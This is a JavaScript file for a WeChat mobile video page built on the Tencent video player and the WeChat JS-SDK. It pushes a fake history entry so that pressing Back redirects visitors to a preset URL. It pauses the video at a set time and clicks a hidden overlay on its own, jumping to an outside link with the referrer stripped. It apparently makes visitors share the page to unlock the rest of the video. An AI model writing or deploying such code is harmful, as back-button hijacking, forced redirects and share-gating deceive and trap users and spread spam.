var video, player;
var vid = pageGlobal.vid;
var playStatus = 'pending';

if(location.href.indexOf('continue') > -1) {
    vuxalert('分享成功, 请点击按钮继续播放!');
    playStatus = 'continue';
}
if(pageGlobal.playStatus == 'continue') {
    playStatus = 'continue';
}

new Swiper('.swiper-container', {autoplay: 5000});

$(function(){
	setTimeout(function() {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
    }, 100);
    var elId = 'mod_player_skin_0';
    $("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
    var elWidth = $("#js_content").width();
    playVideo(vid,elId,elWidth);
    $("#pauseplay").height($("#js_content").height() - 10);

    if(playStatus == 'pending') {
        var delayTime = pageGlobal.delayTime;
        var isFirst = true;
        setInterval(function(){
            try {
                var currentTime = player.getCurTime();
                if(currentTime >= delayTime) {
                    $('#pauseplay').show();
                    player.callCBEvent('pause');
                    $.cookie(vid, 's', {path: '/'});
                    if(isFirst) {
                        $('#pauseplay').trigger('click');
                    }
                    isFirst = false;
                }
            } catch (e) {
                console.log(e);
            }
        }, 1000);
    }

    var h = $('#scroll').height();
    $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
    new IScroll('#wrapper', {useTransform: false, click: true});

    // 后退操作
    $(window).on('popstate', function(e){
        if(pageGlobal.backUrl) {
            jump(pageGlobal.backUrl);
        }
    });

    var globalConfig = {};
    globalConfig.jssdkUrl = "jssdkphpversion/getversion.php";
    var pars = {};
	pars.url = location.href.split('#')[0];
	$.ajax({
        type : "POST",
        url: globalConfig.jssdkUrl,
        dataType : "json",
        data:pars,
        success : function(dat){
			wx.config({
				debug: false,
				appId: dat.appid,
				timestamp: parseInt(dat.timestamp),
				nonceStr: dat.nonce,
				signature: dat.signature,
				jsApiList: ['onMenuShareTimeline', 'hideAllNonBaseMenuItem', 'showMenuItems', 'closeWindow']
			});

			var shareData = function(extend){
				var obj = {
					title: pageGlobal.title,
					link: pageGlobal.link,
					imgUrl: pageGlobal.imgUrl,
					desc: pageGlobal.desc,
					success: function() {}
				};
				return $.extend(obj, extend);
			};

			wx.ready(function(){
				if(pageGlobal.playStatus == 'continue') {
					wx.onMenuShareTimeline(shareData({}));
					wx.onMenuShareTimeline(shareData({}));
				} else {
					wx.hideAllNonBaseMenuItem();
				}
			});
		},
        error:function (res) {
            console.log(res)
        }
	});
});

// 视频初始化
function playVideo(vid,elId,elWidth){
    //定义视频对象
    video = new tvp.VideoInfo();
    //向视频对象传入视频vid
    video.setVid(vid);

    //定义播放器对象
    player = new tvp.Player(elWidth, 200);
    //设置播放器初始化时加载的视频
    player.setCurVideo(video);

    //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
    //player.addParam("autoplay","1"); 

    player.addParam("wmode","transparent");
    player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
    player.onallended = function(){
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://s23.cnzz.com/z_stat.php?id=1276340612&web_id=1276340612";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();

    }
    player.write(elId);
}

// 暂停播放
$('#pauseplay').on('click', function() {
    jump(pageGlobal.flyUrl);
});

// 点赞
$('#like').on('click', function(){
    var $icon = $(this).find('i');
    var $num = $(this).find('#likeNum');
    var num = 0;
    if(!$icon.hasClass('praised')){
        num = parseInt($num.html());
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(++num);
        $icon.addClass("praised");
    } else {
        num = parseInt($num.html());
        num--;
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(num);
        $icon.removeClass("praised");
    }
});

// url跳转
function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}